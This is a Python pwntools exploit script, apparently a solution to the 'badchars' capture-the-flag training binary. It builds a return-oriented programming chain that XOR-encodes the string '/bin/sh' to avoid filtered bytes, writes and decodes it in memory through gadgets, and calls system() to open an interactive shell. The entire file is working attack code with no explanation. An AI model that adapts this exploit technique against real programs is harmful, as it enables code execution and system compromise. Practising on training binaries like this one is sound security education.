#!/usr/bin/env python2

from pwn import *

p = process("./badchars")
#p = remote("127.0.0.1", 6666)
context.arch = 'amd64'

bad_char = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1

# gadget
xor_lr15_r14b = p64(0x00400b30)
pop_r14_r15 = p64(0x00400b40)
pop_rdi = p64(0x00400b39)
pop_r12_r13 = p64(0x00400b3b)
mov_qlr13_r12 = p64(0x00400b34)

# usefule address
#raw_bss_section = 0x00601080
raw_got_plt_section = 0x00601000
#bss_section = p64(0x00601080)
got_plt_section = p64(0x00601000)
system_plt = p64(0x004006f0)

# helper function to encrypt string '/bin/sh\x00'
while (1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in bad_char:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

# Stage one: write encrypted string to data_section
buf = "A"*40
buf += pop_r12_r13
buf += binsh
buf += got_plt_section
buf += mov_qlr13_r12

# Stage two: decrypt the string back to '/bin/sh'
for i in range(len(binsh)):
    buf += pop_r14_r15
    buf += p64(xor_byte)
    buf += p64(raw_got_plt_section+i)
    buf += xor_lr15_r14b

#gdb.attach(p)
# Stage three: call system to invoke '/bin/sh'
buf += pop_rdi
buf += got_plt_section
buf += system_plt

log.info("Sending buffer length: %d" % len(buf))
log.info("The xor byte is: 0x%x" % xor_byte)
#print "Debugging info! (all the bytes in hex)\n"
print "Make sure 0a is not in there!\n"
#print " ".join(hex(ord(n)) for n in buf)
print " ".join("{:02x}".format(ord(n)) for n in buf)

p.sendline(buf)
p.interactive()
